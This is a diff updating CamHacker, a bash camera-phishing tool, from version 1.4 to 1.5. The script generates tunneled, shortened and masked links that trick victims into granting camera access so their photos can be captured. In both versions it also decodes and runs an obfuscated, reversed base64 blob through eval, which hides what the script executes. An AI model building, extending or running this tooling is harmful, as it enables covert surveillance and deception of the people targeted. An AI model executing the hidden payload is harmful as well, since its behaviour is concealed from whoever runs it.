@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # CamHacker
-# Version    : 1.4
+# Version    : 1.5
 # Description: CamHacker is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
 # Author     : KasRoudra
 # Github     : https://github.com/KasRoudra
@@ -61,9 +61,10 @@ success="${cyan}[${white}√${cyan}] ${green}"
 
 
 
-version="1.4"
+version="1.5"
 
 cwd=`pwd`
+tunneler_dir="$HOME/.tunneler"
 
 # Logo
 logo="
@@ -76,33 +77,45 @@ ${red}                                            [v${version}]
 ${blue}                                    [By KasRoudra]
 "
 
-# Package Installer
-pacin(){
-    if $sudo && $pacman; then
-        sudo pacman -S $1 --noconfirm
+# Check for sudo
+if command -v sudo > /dev/null 2>&1; then
+    sudo=true
+else
+    sudo=false
+fi
+
+# Check if mac
+if command -v brew > /dev/null 2>&1; then
+    brew=true
+    if command -v ngrok > /dev/null 2>&1; then
+        ngrok=true
+    else
+        ngrok=false
     fi
-}
+    if command -v cloudflared > /dev/null 2>&1; then
+        cloudflared=true
+    else
+        cloudflared=false
+    fi
+    if command -v localxpose > /dev/null 2>&1; then
+        loclx=true
+    else
+        loclx=false
+    fi
+else
+    brew=false
+    ngrok=false
+    cloudflared=false
+    loclx=false
+fi
 
 # Kill running instances of required packages
 killer() {
-if [ `pidof php > /dev/null 2>&1` ]; then
-    killall php
-fi
-if [ `pidof ngrok > /dev/null 2>&1` ]; then
-    killall ngrok
-fi
-if [ `pidof cloudflared > /dev/null 2>&1` ]; then
-    killall cloudflared
-fi
-if [ `pidof curl > /dev/null 2>&1` ]; then
-    killall curl
-fi
-if [ `pidof wget > /dev/null 2>&1` ]; then
-    killall wget
-fi
-if [ `pidof unzip > /dev/null 2>&1` ]; then
-    killall unzip
-fi
+    for process in php wget curl unzip ngrok cloudflared loclx localxpose; do
+        if pidof "$process"  > /dev/null 2>&1; then
+            killall "$process"
+        fi
+    done
 }
 
 # Check if offline
@@ -118,46 +131,24 @@ netcheck() {
     done
 }
 
-# Delete ngrok file
-ngrokdel() {
-    unzip ngrok.zip
-    rm -rf ngrok.zip
-}
 
 # Set template
-replacer() {
-    while true; do
-    if echo $option | grep -q "1"; then
-        sed "s+forwarding_link+"$1"+g" grabcam.html > index2.html
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        break
-    elif echo $option | grep -q "2"; then
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" festivalwishes.html > index3.html
-        sed "s+fes_name+"$fest_name"+g" index3.html > index2.html
-        rm -rf index3.html
-        break
-    elif echo $option | grep -q "3"; then
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" LiveYTTV.html > index3.html
-        sed "s+live_yt_tv+"$vid_id"+g" index3.html > index2.html
-        rm -rf index3.html
-        break
-    elif echo $option | grep -q "4"; then
-        sed "s+forwarding_link+"$1"+g" template.php > index.php
-        sed "s+forwarding_link+"$1"+g" OnlineMeeting.html > index2.html
-        break
+url_manager() {
+    if [[ "$2" == "1" ]]; then
+        echo -e "${info}Your urls are: \n"
     fi
-    done
-    echo -e "${info}Your urls are: \n"
-    sleep 1
-    echo -e "${success}URL 1 > ${1}\n"
-    sleep 1
+    echo -e "${success}URL ${2} > ${1}\n"
+    echo -e "${success}URL ${3} > ${mask}@${1#https://}\n"
     netcheck
-    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
-    if ! [[ -z $masked ]]; then
-        if echo $masked | head -n1 | grep -q "https://"; then
-            echo -e "${success}URL 2 > ${masked}\n"
+    if echo $1 | grep -q "$TUNNELER"; then
+        shortened=$(curl -s "https://is.gd/create.php?format=simple&url=${1}")
+    else 
+        shortened=""
+    fi
+    if ! [ -z "$shortened" ]; then
+        if echo "$shortened" | head -n1 | grep -q "https://"; then
+            echo -e "${success}Shortened > ${shortened}\n"
+            echo -e "${success}Masked > ${mask}@${shortened#https://}\n"
         fi
     fi
 }
@@ -170,9 +161,9 @@ stty -echoctl
 trap "echo -e '\n${success}Thanks for using!\n'; exit" 2
 
 
-echo -e "\n${info}Please Wait!...\n"
+echo -e "\n${info}Please Wait!...\n${nc}"
 
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=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' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogIXFlckIzYIRCekEHMORiIgwWY2VmCpICcahHJVRCTkcVUyRie5YFJ3RiZkAnW4RidkIzYIRiYkcHJzRCZkcVUyRyYkcHJyMGSkICIsFmdlhCJ9gnCiISPwpFe7IyckVkI9gHV7ICfgYnI9I2OiUmI9c3OiImI9Y3OiISPxBjT7IiZlJSPjp0OiQWLgISPVtjImlmI9MGOQtjI2ISP6ljV7Iybi0DZ7ISZhJSPmV0Y7IychBnI9U0YrtjIzFmI9Y2OiISPyMGS7Iyci0jS4h0OiIHI8ByJaBzZwA1UKZkWDl0NhBDM3B1UKRTVz8WaPJTT5kUbO9WSqRXTQNVSwkka0lXVWNWOJlWS3o1aVhHUTp0cVNVS3MmewkWSDNWOiJDZEJGRVlXWtR3dRdlU0JWRkhWZrpERTdFZCFWVOFnUqpkaiVkSEN1VkJUYV10MjFjUOpVMGlVWUJ1VSBzazMlVOlVTUZFWUdkSDVVMnhXTYxGWapnQHZFbNVjUWZlbRZFaNl1aKR1VGB3SNZlUWRFbWNVVygnRV1GZSZFM4lWUs5UWVFjWGZVRZFTYxI1VVtmWK1ERGVjVyM2diZkURJWRWdVVUxmRThVW4VmVk5WTFpFakhkTHN1V58kYrhndUtGZKJGM1k1VXx2QhVVOzplRkpVZsp1cTdFZWZFM452TFRGahxmWINFWCZXUwwmbRVlTKpFMGR0UXRmdkBDOzEVVSpUTHhHSadFeDVWV5AXUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5mYxYETPZlWGZ1aKNlUWZ1VkVEaLplM5UkWI50VXZEb0Z1akNlYwYEVXpmQHJVMwNjVrhmSlRFb0dVbkpXTsx2chRkSSpFMGR0UXRmQRBDb3Z1V1kGZHRGRTdFeTdlRsJXUsh2akREa0llbRdXUwwmehFjTrR2RkR1VqJ0RSFDczYFbo1EZFZERTVFdSZVMvlnUqpkaaFjV0d1VkNjUyo0daVEaKVGbZl3VtdGeWJjRuZ1VxomYHdWeadEZyJWbOJTVq5kWiVEcZlVVWNUUwwWYTpmRVZVV1YVVs50cSZlSuFmM1oGZslkeXdFeLd1RGJXTW5UTaNDZUZVMNVjUWpVRW1GdWNFbKZ0UXNHeRBDbuJGMGp0YEJUdWVlW0YlVKBlTWZ1VWhlUJNVbkZnUHJleWxGaaJmVahUVtljQlZFcxI2RxkmYGpUdZNjWv1UbO5GZyEjaNVlSwl1MaFmUwwWNWtGZpJGRWRXWqZ0UTVEbzFWRktmWxsWeZ1GZWZlMK9mTVZlSaBjREN1VkpkVspkTW1GdVRVMadkVtRmSXZEc6ZVbxkGZWpVSahUU3FFMsp3UWp1UUZlWyZVR5clUsplbVZFaNpFMGBXUyQmcVJjWWNlaGVVVYJVST1GZ2J1RSpnVshmWiZlWIVVb5IUYX50cX1WNqJWR1c0UYB3ahdlTzRGRKpVYHhmVZ1GaPJVVsR3TVRmSNV0b6lFbGNUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTZlVL1kVSJVUr50alRFbIl1MRdXUwwmeVdFeWVVRKd0UYNGeRBDbuJWMGFWTFpFSZ52Y4ZVMvdXUs5UYiFjSJN1VwUjUwsGMWtGZhR2V4Z0UXRmQRBDbuFVVOpkWwYERTd1Yw0kRStUVrplVVVkSwllbaNnUyI1MPZFZNRWRGREVFhTNWZlTWFlaGVlW6hGWUdEZCFWVNdnYFRGbiVkSEdlbWdkUww2caZEZaV2a1k1VuJ1QRJjT6Z1akhmWwETWZdVOTNVRrp3TVRGaWVkSEN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjRJlVb49mVwgHMRVlTNJmeGR0UXRmdRVFbuJ2MwpGZUxGWZRlQD1UMSxkYxYUWNRlVYR1RKNUVxcGeNhFbYpleCdkVs1UNSZlVuFlVo1UWrpEVXZEcL1kVSZFVsZ1UVJDeGVVbkJlVwgXaRxmTZVVMaZkVFlVMhFjUXV1aapUTEZUNWJzY3JmRSFlYFZ1VVRFbGNFWZhXZWRmbNVkWoRGSOd0UXlzTitGe2R1akpkYwUTWXdFbDFWV5MnWGRmWlxmWzN1VkZlVwgnbPVEZoFGbah0UYJkQTdkSzFmRk1EZIRWSZhlUCFFMs5WUV5kSaBjRENVV0pXZrlzcUtGapFmRwhVVFp1UWxmRGFFbadlWyQHVXpmQHJVMwNjVshWTkpmVYRFSSNzVHJVMNVlTKpFMGR0UXRmQRBDbuJ2MkBlTxYFWahEbTdlRCdUVsplUSVlSXZVbkJXVx82dStGZhRWMalFVIJ1MXdkUwEVVOpkWwYERTdFZCFFMsx0YzAHUNZEcYl1V580UFt2MTdFbOFGMsRVVGB3SNZlUWRFbWNVVygnRV1GZyVlMWVzTVR2ahxmW0l1MCNlVwgHMkBDahRWRGR0UXRmQRBDbuFVVOp0Uz4kNUpnQhZlMGZHVrhmSOBDbwR1V0pUVxIEVWtmVVJlaWJnVGp1UStGb3NlVoF2YxoFdZ5mVXN1RSBTTF5UbNRkREN1VkJUUwwmbRVlTKplM5I0UXRmQRBDbuFVVOpkWz4kNUpnQhZlMGZHVrhmSOBDbwR1V0pUVxIkVTpmRVVVVKR1U6J0SNJjSz0kVO10TFpUWUdEZCFFMs5WUV5kSaBjRwFlekpnUHJFdiVEZoV2aKVDVywmSSVEcw10RwVVVHhnRWxWR1IVVsdnTEpUajZkSJl1MZhXVwcHNPZFZNpFMGR0UXRmQRBDbuF1VsREZXhHSThFaSFFMsNHVshmWhtmSEN1VkJUYV5kMVtGZK5keCd1VHRmQSV0a3plRk1kWwwWNTdFdKFFMslGZFplSihEaYl1V5smYr50cW1WNq1ERGVVVsZ1RSZlSSZVb4RkYGpVdZpXQ4ZlRkR1TVZ1VSZkWyZVVwNVYw4EcVZFZhVWVahUWtFzUWJjUyUGRKpVYUJUcWVlW0YlVKBlTWZ1VWhlQCRFVSJkUFhTNVdFeWVVRKNXUyg3Vi1WT310VwVVVHhnRWxWR1EGMOxkYxYUbTFjV0llbaNlUwwmbRVlTKNlM0R3VtRmQRBDbuFVVOpkWwYEcRNjQhJFMs5WUV5kSaBjREN1VkJUUwwmbRdFbEFmVWhUWuJUYSBDcyMlVohWY6x2cZJDe0YVMwFjTWR2aNZkSwN1Vk5WTwQnbVRlSpR2Rnl3VXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaJTOSdlbwRjVxAnbRVlTKpFMGR0UXRmQRBDbuFVVOp0UwwGVX5mTzJmVwJ3THxmajZUS5dFSsdlUyo0cOdVMp1kVKl0UtxmQRJjV5FVVOFGZqZESZdFcDV2VKJnVq5kaaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuJmMklmYHhGSadEZ6VWbKJnVq5kahBjRwdlbCNUUwwmbRVlTKpFMGR0UXRmQRBDbuJmMkp2YGlUeXhEbXJlMKNnTXFTaNZlSJNVbkZlUyo0dXtGZLpVMshFVHRmWXdkSuFVVOpkWwYERTdFZCFFMs5WUV5kSTpnUYdVb5M1UFt2MNVkWKFmVWhUWuJUYSBDcwF1VsFGZFZUNWJDZaZlMG5WUV5kSaBjREN1VkJUYV5kMVtGZK5kMklUWt9WNSJjSuVlVkFWZVpFSZ1WMTZlMSJTZEpkWaNTT5llbstmYXpkbOZEZopVMWhUWuJUYSBDb180VxEmWwYERTdFZ2V1VGRXUr5kSaBjRwF1MsJVUwwGdTxGaNpleCRXWyQmQRBDbuFVVOpkWwYEcRNDaaFmVCVTUV5UajFjW1llbap1VGBncPVlTKtEMGR0UXxmSSVEcwFVVOp2YIJUdZpmRDFFMs5WUV5kSaBjRENVVzBjVxAndVtGaK5EMsRUWzI0ditGbuJlVo1kWwYUWX5GbrJFMrRTUtxmSlZlRwN1VjRjUyYUcWtGZKJ2V4h0UXRmQRBDbMFmMxEmWwYERTdFZ2pFMxIXUXxWYlRlRENFWSt0UFxmbRVlTKpFMGR0UXRmdaBDb1U1VspkWxwGSaRVW4FFMsVjUrR2aaBjREN1VkJUUwwmbRdFbERmVahUWUJ0QlVVOwJmeOFWTFBHRTh1Z4FFMsNjVtFjaitmSEpVbkpUYVFjcTVlTKRWbnl3VXh3QhZFc3F1aOpkWwYEcRJDbKJVRwBXUYxWVkVkRwNFWoJVYVxmbURlTqJWRvp3Vup1STdkTwkleOlmYwUTWUhkUCVlMOBTUV50aidUU5p1RkJUUwwmbiJDZKRGWoNHVIVFMVJjWx5EVKxWY6JUdXhEbXJlMKNnTXFTaNZVS6p1VzdnYtp0cW1WMqJmbSl0UtRmaidlS3VFbkpFZuhGdZpWT1IVMJVzTXFTYkd1d5p1VzBjUxgGcRZlThRWRGVTWtlzTWFDcuFVVOpkWykjUa5WRwUFMwVzYwg2SPVFbZdlbOdlYXpUMWtGarpFMGR0UXRmdkJjRxZ1akhWYspUWX5mVDFFMs5WUXxGROBjSUNlM5o0VGBneW1WMpRmValkWHp1VNxGcv5kVkpFZIJkUahFbH1UbOZjVqpkWiRkVIN1VxMnUws2dUxGZaVmVKlkWXh3QRFDcxI1akpUZWpFSZ12dxI2VJhXVrhmShBTW5llbNFTTtJlMVtmVKFWb54WUzIUYiVlT0EVVOt2YHhWWX1GZCFFMsx0UW5kSlZlWIl1MaRjVx8WeWtGZhpFMWh0UUVUNWJjVuZFVKhWYEZESTRlQrF2VKZjVqpUahBjS1kVb0UjUyokbSVFZKJmaWhVWXB3RSJjSzYVbxYlW6JUdZNjWLJWbONHZFh2ShVlRUdlbSJUZXpkdUxGZhpFMGR0UVNHMWFDc2V1aopkT6J0VXdEZKFWVxIjWEpUajFjSwN1VjdnVFxmbThFbpJmashUWtRnSRBDbpRWRapkYXhHdRJDb2VlVo92UrhWYNRFb0ZFWwdUTs5kbhJTNSl1aKR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkW6JUWXpmR0ImVrNTVtxGRaRkR1llbaNXTt5UNW1WMr5UMKBnWHp0QRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQRBDbuFVVOpkWwYERTdFZCFFMs5WUV5kSaBjRENFVsNlVxAXNkVEaLN1Mjp3VEdWNNZFatVGRGlVWzcmeXR0Z10kVo1WZFpVba5Ga1c1RaRjUtpVblVEaK9ERsdkWtpFNTV0a08UVa1mWzMmeXR0Z1I1a412TVpVWap2a4d1RaRjUrtWNaRkTpN2Moh1VqZFMTVEcMRGMopEZqdGeXdEZCFVMC5WUV5kSPR0a4d1R5IUUyolbkpnTZJGMGRkWtRmQlZFauFVVO1mWzQWSTRFaDFlMa5GZwgmSPVkSEpVba9WUwsGNPRlRZ9URKRkWqx2VSJjSzMFbotGZzIVSTtGdz0UMo1mWF5kSZBjS1c1RjRTUwwmMkBDaK9ERrh3VHNGNRJjWul1MsllW6hGRa1GZz0UMnRTUr5UbZBjS1c1RkpWUwwWbaVkTK9URKVzUtp1QlVFeuFVVOp0TFpERap2axYVMrFDVqpEbhJTOzc1RaNUZWhmbPRkRZplarh3VHR2MTV0a08EVGllWrpERTdlWDVmVo1WUr5UbaNDZJNFVoNUUyolbPRkRZp1aKVzVHp1QlZFau9URapkWqx2Ra1WW10kVo52TF5kSPZlSYdlbsBzUFBHTPVkWKpFMGR0UXRmQRBDbuFVVOpkWwYUNXdEZCFFMs1WUr5kSaBjREN1VkJUUwwmbRVlTKpFMGR0UXRmQlZFat9EVGllWwYEVa5mVXZVMwVjWEpEbhJTOuNFVspUZtpUdPVFZppUeChTSIlUaPBDa0Mlawk2Y5l0NTdUT5B1UJl2TykVOJ1mR6lka0JXWwUVOJ5mQoNWeJdTWwYVbQNlSop1UJdjWEBTailXS3YlasZDUTlkMJpGdR90RNlTStxWbJpGdWB1UJdGTXFVaPBDcqB1UKxmWpl0NUpmQ4B1UJl2TzkVOJ1WSp90MjlTStVVaPJTS5kkbZdmZDl0NWh0Z5k0aWt2Y5l0NlZEc3B1UJl2QudWOKNEasRWbGNXSDl0aTdUT5pESjtWW5JVeVZ1Yrp1QSpnSIN2aZlmUJlleJtGZpJFNX5WQrpVaSNjSGlVNllmU5VlVjtGVDJlVKhEahN2QJB3QtZlMZd1dnlUaS9UTIV0alNkUJlleJt2YsZEWJd2b9cCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
 x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
 eval "$N0q$x$Hc2$rQW"
 
@@ -181,7 +172,6 @@ eval "$N0q$x$Hc2$rQW"
 
 # Termux
 if [[ -d /data/data/com.termux/files/home ]]; then
-    termux-fix-shebang ch.sh
     termux=true
 else
     termux=false
@@ -189,7 +179,7 @@ fi
 
 # Workdir
 
-if [ -z $DIRECTORY ]; then
+if [ -z "$DIRECTORY" ]; then
     exit 1;
 else
     if [[ $DIRECTORY == true || ! -d $DIRECTORY ]]; then
@@ -220,11 +210,9 @@ fi
 if [ -z $TUNNELER ]; then
     exit 1;
 else
-    if [[ $TUNNELER == "cloudflared" || $TUNNELER == "ngrok" ]]; then
-        TN=${TUNNELER^}
-    else
-        TN="Cloudflared"
-    fi
+   if [ $TUNNELER == "cloudflared" ]; then
+       TUNNELER="cloudflare"
+   fi
 fi
 
 
@@ -239,186 +227,137 @@ else
    fi
 fi
 
-
-# Set Package Manager
-if [ `command -v sudo` ]; then
-    sudo=true
-    if [ `command -v apt` ]; then
-        pac_man="sudo apt"
-    elif  [ `command -v apt-get` ]; then
-        pac_man="sudo apt-get"
-    elif  [ `command -v yum` ]; then
-        pac_man="sudo yum"
-    elif [ `command -v dnf` ]; then
-        pac_man="sudo dnf"
-    elif [ `command -v apk` ]; then
-        pac_man="sudo apk"
-    elif [ `command -v pacman` ]; then
-        pacman=true
-    else
-        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
-        exit 1
+# Install required packages
+for package in php curl wget unzip; do
+    if ! command -v "$package" > /dev/null 2>&1; then
+        echo -e "${info}Installing ${package}....${nc}"
+        for pacman in pkg apt apt-get yum dnf brew; do
+            if command -v "$pacman" > /dev/null 2>&1; then
+                if $sudo; then
+                    sudo $pacman install $package
+                else
+                    $pacman install $package
+                fi
+                break
+            fi
+        done
+        if command -v "apk" > /dev/null 2>&1; then
+            if $sudo; then
+                sudo apk add $package
+            else
+                apk add $package
+            fi
+            break
+        fi
+        if command -v "pacman" > /dev/null 2>&1; then
+            if $sudo; then
+                sudo pacman -S $package
+            else
+                pacman -S $package
+            fi
+            break
+        fi
     fi
-else
-    sudo=false
-    if [ `command -v apt` ]; then
-        pac_man="apt"
-    elif [ `command -v apt-get` ]; then
-        pac_man="apt-get"
-    elif [ `command -v brew` ]; then
-        pac_man="brew"
-    else
-        echo -e "${error}No supported package manager found! Install packages manually!\007\n"
-        exit 1
-    fi
-fi
+done
 
-
-# Install Dependicies
-if ! [ `command -v php` ]; then
-    echo -e "${info}Installing php...."
-    $pac_man install php -y
-    pacin php
-fi
-if ! [ `command -v curl` ]; then
-    echo -e "${info}Installing curl...."
-    $pac_man install curl -y
-    pacin "unzip"
-fi
-if ! [ `command -v unzip` ]; then
-    echo -e "${info}Installing unzip...."
-    $pac_man install unzip -y
-    pacin "unzip"
-fi
-if ! [ `command -v wget` ]; then
-    echo -e "${info}Installing wget...."
-    $pac_man install wget -y
-    pacin "wget"
-fi
+# Check for proot in termux
 if $termux; then
-if ! [ `command -v proot` ]; then
-    echo -e "${info}Installing proot...."
-    pkg install proot -y
+    if ! command -v proot > /dev/null 2>&1; then
+        echo -e "${info}Installing proot...."
+        pkg install proot -y
+    fi
+    if ! command -v proot > /dev/null 2>&1; then
+        echo -e "${error}Proot can't be installed!\007\n"
+        exit 1
+    fi
 fi
-if ! [ `command -v proot` ]; then
-    echo -e "${error}Proot can't be installed!\007\n"
-    exit 1
-fi
-fi
-if ! [ `command -v php` ]; then
-    echo -e "${error}PHP cannot be installed!\007\n"
-    exit 1
